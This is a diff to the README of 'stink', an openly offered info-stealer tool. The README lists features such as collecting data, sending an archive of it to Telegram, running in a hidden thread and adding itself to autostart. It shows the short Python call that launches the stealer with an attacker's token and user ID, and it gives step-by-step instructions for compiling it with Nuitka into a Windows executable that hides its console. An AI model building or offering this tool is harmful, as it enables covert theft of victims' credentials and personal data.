@@ -13,8 +13,6 @@ The `stink` already has an impressive functionality that will only expand.
 
 ## Navigation
 * [Current features](#Сurrent-features)
-* [Future features](#Future-features)
-* [Installation](#Installation)
 * [Example usage](#Example-usage)
   * [Standard](#Standard)
   * [Additional parameters](#Additional-parameters)
@@ -46,17 +44,6 @@ The `stink` already has an impressive functionality that will only expand.
 3. Sending an archive of collected data to Telegram.
 4. Execution in a separate thread.
 5. Possibility to add to autostart.
-
-### Future features
-1. Support for other browsers.
-2. Other features.
- 
-## Installation
-
-You can install the latest version with the command:
-```
-pip install stink==1.3.0
-```
 
 ## Example usage
 ### Standard
@@ -136,7 +123,9 @@ We will need Nuitka to do this.
 
 ### Creating executable file
 
-Create a test.py (or any other name) file with the following code:
+1. [Download](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) archive.
+2. Create a directory and unpack the archive in it.
+3. Create test.py (or any other name) file in the same directory with the following code:
 ```python
 from stink.multistealer import Stealer
 
@@ -144,9 +133,8 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ```
 
 #### With BAT
-1. Download [compiler](https://github.com/FallenAstaroth/stink/releases/download/v1.3.0/compiler.bat).
-2. Move it to the same directory as the test.py file.
-3. Run compiler.bat.
+1. Run compiler.bat.
+
 
 #### With CMD
 1. Open `cmd`.
@@ -165,12 +153,9 @@ virtualenv venv
 ```
 venv\Scripts\activate
 ```
-5. Install Nuitka and Stink:
+5. Install the requirements:
 ```
-pip install Nuitka==0.6.16.4
-```
-```
-pip install stink==1.3.0
+pip install -r requirements.txt
 ```
 6. To reduce the file size, additionally install Zstandard (optional):
 ```
@@ -178,7 +163,7 @@ pip install zstandard==0.17.0
 ```
 7. Write the command:
 ```
-nuitka --onefile --windows-disable-console --include-package=stink test.py
+nuitka --onefile --windows-disable-console test.py
 ```
 
 After executing the command we get the test.exe file with the hidden console.
